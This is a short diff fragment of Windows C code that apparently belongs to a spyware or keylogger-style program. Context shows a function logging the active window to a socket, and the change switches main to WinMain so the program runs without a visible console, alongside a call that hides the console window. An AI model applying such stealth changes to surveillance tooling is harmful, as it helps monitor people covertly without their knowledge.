@@ -116,7 +116,7 @@ void logActiveWindow(SOCKET sock) {
     }
 }
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
     HideConsoleWindow();
     SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
